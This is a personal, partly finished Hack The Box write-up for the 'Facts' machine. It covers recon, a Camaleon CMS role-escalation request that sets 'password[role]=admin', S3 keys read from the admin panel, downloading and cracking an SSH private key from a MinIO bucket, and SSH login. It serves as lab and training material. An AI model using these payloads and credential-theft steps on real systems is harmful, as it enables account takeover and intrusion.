---
date created: Saturday, January 31st 2026, 7:00:47 pm
date modified: Monday, February 2nd 2026, 9:41:14 am
---

# Facts

**Platform:** Hack The Box
**OS:** Linux
**Difficulty:** Easy
**Date Started:** 9:15pm 31/01/26
**Date Completed:**

---

## Reconnaissance

### Port Scan
- `nmap -sC -sV -p- --min-rate 5000 10.129.15.7`
	- `port 22/ssh/OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)`
	- `port 80/http/nginx 1.26.3 (Ubuntu)`
	- `port 54321/unknown`
		- But we can see in the header: `MinIO` - which is an S3-compatible object storage service.
### Directory Enumeration
- `gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt`
	- `http://facts.htb/admin/login`
	- `/error`, `/sitemap.gz`
		- Reveal that the service is running Ruby on rails.
		- Has comment showing: `This file lives in public/500.html`
	- `/up, /rss`
		- Blank pages
	- `http://facts.htb/sitemap.xml`
		- Has a file that shows the structure of the website. Each location has a priority and change frequency.
	- /page
		- Shows a list of all posts made, allows for browsing.

### Service Enumeration:

Make sure to add `facts.htb` to `etc/hosts` like so:
```Bash
su
sudo echo "10.129.15.7 facts.htb" >> /etc/hosts
exit # Or CTRL+D
```

The website is a page of facts that you can scroll between.

At first we can see a MinIO port that is exposed, if we try to access port 54321 via cURL:
```Bash
curl http://facts.htb:54321/
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied.</Message><Resource>/</Resource><RequestId>188FE777C1CB39EA</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
```

We can also try creating an account on `facts.htb/admin/login`:
```
First Name: Test
Last Name: Tester
Email: test@test.com

Credentials: test:Password123
```

And you can login to the admin browser!

### Admin Panel Enumeration:

Admin panel runs using Camaleon CMS - Version 2.9.0. 

Some interesting details are:
- I've got a `ID=5` and the `Role=Client`.

Searching online for vulnerabilities reveals:
- <https://nvd.nist.gov/vuln/detail/CVE-2025-2304>
- <https://github.com/advisories/GHSA-rp28-mvq3-wf8j>
- <https://www.tenable.com/security/research/tra-2025-09>

The vulnerability allows you to promote yourself to admin through injecting commands into the role attribute of a request. 

We can enable FoxyProxy and use Burp Suite to intercept the password change request, changing the bottom of the body to have the following:

```json
_method=patch&authenticity_token=yxK2i-LKWi_julIa5YQStJvTTsI_CcVev_YAJoE4RfK5jrBWZ7qeKutOzsBbQIrWxxhBiVfZilL9pcvfx4PWRw&password%5Bpassword%5D=abc&password%5Bpassword_confirmation%5D=abc&password%5Brole%5D=admin
```
and your role gets updated to administrator.

We can see within the **Users** tab, that we have another user created on the 8th of Jan 2026. Called `admin/admin@local.com/Administrator` - With an impersonate option?

We can see bucket information as followed within the filesystem tab:
```plaintext
AWS S3 Access Key: AKIA5208FFAF9CA55D87
AWS S3 Secret Key: /WG6cYqiPQ7adeSV87UApPP+beLQy48QbywNY0IJ
AWS S3 Bucket Name: randomfacts
AWS S3 Region: us-east-1
AWS S3 Bucket Endpoint: http://localhost:54321
Cloudflare URL: http://facts.htb/randomfacts
```

### Browsing the S3 Bucket:

We can start to search through the s3 bucket like so:
```Bash
# Note that the AWS details will change, if you reset machine
export AWS_ACCESS_KEY_ID="AKIA7452E3219BC5A842"
export AWS_SECRET_ACCESS_KEY="7QdW6AQ/S3FLdleZOVLzC2ywrPpsvgIJui+5ePSw"

# List buckets
aws --endpoint-url http://facts.htb:54321 s3 ls

# List contents of the randomfacts bucket
aws --endpoint-url http://facts.htb:54321 s3 ls s3://randomfacts/

# Recursively list everything
aws --endpoint-url http://facts.htb:54321 s3 ls s3://randomfacts/ --recursive

aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/ --recursive | grep -v '.bundle/cache' | grep -v '.cache'
2026-01-08 12:45:13        220 .bash_logout
2026-01-08 12:45:13       3900 .bashrc
2026-01-08 12:47:17         20 .lesshst
2026-01-08 12:47:17        807 .profile
2026-01-31 13:07:19         82 .ssh/authorized_keys
2026-01-31 13:07:19        464 .ssh/id_ed25519
```

We see that there are two buckets `randomfacts` and `internal`. `internal` holds the `id_ed25519` SSH private key. We then download this key using the following:

```Bash
# Downloading the SSH private key
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
chmod 600 id_ed25519 # We can tell from the website that the username is likely Administrator or admin
```

Looking at the private key, it is encrypted - `aes256 and bycrypt` in the header.
```Bash
ssh2john id_ed25519 > id_ed25519.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash

dragonballz      (id_ed25519) # This persists.
```

But what is the username?
```Bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.bashrc -
```

Finally we can login via SSH:
```Bash
ssh -i id_ed25519 trivia@facts.htb
```

Then we can find the user flag:
```Bash
find / -name "user.txt" 2>/dev/null
```

---

## Foothold

### Attack Vector
- Vulnerability or misconfiguration identified:
- How it was discovered:

### Exploitation
- Steps taken:
- Tools/exploits used:
- Shell obtained (type and privilege level):

---

## Privilege Escalation

### Local Enumeration
- Current user and permissions:
- Interesting files, services, scheduled tasks:

### Escalation Path
- Technique used:
- Steps taken:

---

## Flags
- **User flag:**
- **Root flag:**

---

## Key Takeaways
- New tools or techniques learned:
- What worked, what didn't:
- Concepts to revisit:

---

## Commands Reference
Notable commands worth remembering from this box: